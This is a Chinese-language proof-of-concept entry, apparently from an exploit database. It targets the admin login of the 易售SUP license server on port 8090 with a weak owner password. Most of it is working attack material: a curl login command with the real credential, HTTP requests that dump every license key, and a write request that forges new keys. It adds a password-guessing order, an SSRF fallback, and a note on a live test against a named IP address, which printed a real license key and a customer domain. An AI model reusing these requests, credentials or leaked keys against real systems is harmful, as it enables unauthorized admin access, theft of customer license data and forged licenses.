# 易售SUP(易信SUP同族) 授权服务器 :8090 /admin/login 超管弱口令 admin/yishou2026 → owner token 直读全量授权码并自建授权（写控制面）

- **code**: yishou-sup-authserver-admin-login-weak-password-owner-token
- **kind**: poc
- **category**: weak-password
- **component**: 易售SUP 授权服务器管理后台（:8090 /admin/login，Go 后端，Bearer token 鉴权）
- **severity**: critical
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1282，2026-11-06 在本机 curl.exe 直连 149.104.30.75:8090 实测：① POST /admin/login {"username":"admin","password":"yishou2026"} → 200 {"code":0,"data":{"role":"owner","role_name":"超级管理员","token":"8b30e736...|1794012600|admin"},"message":"ok"}；② 带该 Bearer token GET /admin/licenses → 200，返回 16 条真实授权码（license_key + 客户绑定域名 + machine_code，如 YS-M85X-QC85-RQV5-RJQ8 / www.kuaishou.xin）；③ POST /admin/licenses/create {"customer_id":5,"plan":"flagship","days":365,"domains":"pc.kuaishou.xin"} → code:0 返回新 key YS-KQ68-DYC2-3SNS-FUWM，证明是 owner 写控制面。阴性对照：admin/yishou123、test/yishou123、20 个 tenant_key 当口令、用户名变体全部回 45B「账号或密码错误」。
- **path**: pocs/yishou-sup-authserver-admin-login-weak-password-owner-token/poc.http
- **tags**: weak-password,易售,易信,sup,授权服务器,8090,admin-login,owner,超管,token,license,授权码全量,写控制面,礼品卡任务
- **created_at**: 2026-11-06T00:59:37.149Z
- **engine**: http://149.104.30.75:8090

## 描述

易售SUP / 易信SUP 家族的授权服务器在 :8090 上另开一个纯 JSON 管理后台 /admin/login，无验证码、无频控、失败文案恒为 45B「账号或密码错误」。口令按产品名派生（yishou2026）即可登入，拿到 role=owner 与长期 Bearer token：可读全部客户与全量真实授权码（license_key/绑定域名/machine_code），也可 POST 自建授权码。前提仅 8090 可达，无需任何既有凭据；与同族 /auth/activate 免鉴权泄露条目的区别是本条拿到管理员身份与写能力。

## 用法

```
前置：:8090 可达（若只监听 127.0.0.1，走同族 Activate/GoSystem auth_server SSRF）。登录接口是纯 JSON，无验证码、无 CSRF、无锁定，可放心小字典打。

1) 指纹确认（先排误判）：GET http://TARGET:8090/admin/login → 管理后台登录页/JSON；同端口 /auth/activate 回 {"code":1,"message":"缺少 license_key"} 即确认是易售/易信SUP 授权服务器。
2) 失败基线（拿回显长度做对照）：故意错口令 → 恒为 HTTP 200 + 45B body「账号或密码错误」。判定只看 body 里是否出现 code:0 + token，不要用状态码。
3) 命中请求：
   curl -sS --noproxy '*' -i -X POST http://TARGET:8090/admin/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"yishou2026"}'
   判据：200 + {"code":0,"data":{"role":"owner","token":"<hex>|<exp>|admin"},...}
4) 取全量授权码：
   GET /admin/licenses，头 Authorization: Bearer <token> → data.list[] 含 key/domains/machine_code/customer_id。
5) 写侧（有副作用，按需）：POST /admin/licenses/create {"customer_id":N,"plan":"flagship","days":365,"domains":"x.example"} → code:0 返回新 key；先 GET /admin/customers 拿 customer_id。

弱口令候选顺序：admin/yishou2026、admin/yishou123、admin/admin123、test/yishou123、admin/域名主体+年份；先把页面上出现的品牌词（yishou）当语素组合，再退通用字典。另可把已泄露的 tenant_key、license_key 当口令试（本目标 20 个 tenant_key 均不通，但成本低）。

失败常见原因：回 45B「账号或密码错误」= 口令错，不是被风控（无锁定、无验证码）；④ 端口是 8080/8081 控制台而非 8090 授权服务器 → 路径不存在；⑤ 401/跳 HTML = 换了实现或前置反代加了 Basic 认证；⑥ token 失效重登即可（token 形如 hash|unix过期|用户名）。
注意：/admin/licenses/create 会真实写入授权库，属可观测改动；只读场景止于第 4 步即可。
```

## 正文

```
# 易售SUP 授权服务器 :8090 管理后台超管弱口令（owner 全量授权码读写）

## 0. 指纹
- `:8090`，Go 后端，同时存在公开校验端点 `/auth/*` 与管理端点 `/admin/*`。
- 确认：`GET /auth/activate` → `{"code":1,"message":"缺少 license_key"}`（200）。
- `GET /admin/login` + 同端口即可判定是易售/易信SUP 授权服务器，而非 8080/8081 业务控制台。

## 1. 失败基线（务必先做一组对照）
```http
POST /admin/login HTTP/1.1
Host: <target>:8090
Content-Type: application/json

{"username":"admin","password":"admin"}
```
```http
HTTP/1.1 200 OK
账号或密码错误
```
固定 45 字节纯文本。**不要用状态码判成败**（成功也是 200）。

## 2. 命中登录
```http
POST /admin/login HTTP/1.1
Host: <target>:8090
Content-Type: application/json

{"username":"admin","password":"yishou2026"}
```
```http
HTTP/1.1 200 OK

{"code":0,"data":{"role":"owner","role_name":"超级管理员","token":"<64hex>|<exp_unix>|admin","username":"admin"},"message":"ok"}
```
判据 = body 出现 `code:0` 且 `data.role=owner`、`data.token` 非空。

## 3. 拿全量授权码（读）
```http
GET /admin/licenses HTTP/1.1
Host: <target>:8090
Authorization: Bearer <token>
```
```json
{"code":0,"data":{"list":[
  {"id":8,"key":"YS-XXXX-XXXX-XXXX-XXXX","domains":"<客户域名>","machine_code":"<16hex>"},
  {"id":9,"key":"...","domains":"..."}
]},"message":"ok"}
```
字段：`key`=授权码、`domains`=客户绑定域名、`machine_code`=机器绑定、`customer_id`。同族端点 `/admin/customers` 给客户列表（拿 customer_id 用）。

## 4. 自建授权码（写，有副作用）
```http
POST /admin/licenses/create HTTP/1.1
Host: <target>:8090
Authorization: Bearer <token>
Content-Type: application/json

{"customer_id":5,"plan":"flagship","days":365,"domains":"pc.<域名>"}
```
```json
{"code":0,"data":{"list":[{"id":22,"key":"YS-XXXX-XXXX-XXXX-XXXX","domains":"...","days":365}]},"message":"ok"}
```

## 5. 口令来源思路
口令按产品品牌派生：`yishou` + 年份/常见尾缀。首选序列：
`admin/yishou2026` → `admin/yishou123` → `admin/admin123` → `test/yishou123` → `admin/<品牌><4位数字>`。
次要来源：已泄露的 tenant_key / license_key 当口令（成本低，本目标 20 条均不通）。

## 6. 判定清单
1. 错误口令对照为 45B「账号或密码错误」且 200；
2. 候选口令返回 200 + `code:0` + `data.token` + `role=owner`；
3. 带 token 的 `GET /admin/licenses` 返回真实 key 列表（非空、含 domains/machine_code）。
三条齐才判成立，缺 2/3 只是登录成功。

## 7. 常见失败原因
| 现象 | 原因 |
|---|---|
| 45B「账号或密码错误」 | 口令错；无锁定/无验证码，可继续加字典 |
| 404 | 打的是 8080/8081 业务控制台，不是 8090 授权服务器 |
| 401 / 返回 HTML 登录页 | 实现变更或前置反代加了 Basic 认证 |
| 连不上 | 8090 仅监听 127.0.0.1 → 走 Activate/GoSystem auth_server SSRF |
| token 过期 | 重登；token 格式 `<hash>|<exp_unix>|<user>` |

## 8. 与同族免鉴权条目的关系
- `/auth/activate`（无凭据，需已知 license_key）→ 只能验单个 key、拿元数据、会改绑。
- 本条（超管 token）→ 可**枚举全量**授权码 + 客户，且能**新建**授权码。
先打本条；打不通再用 /auth/activate 的 key oracle 兜底。

```
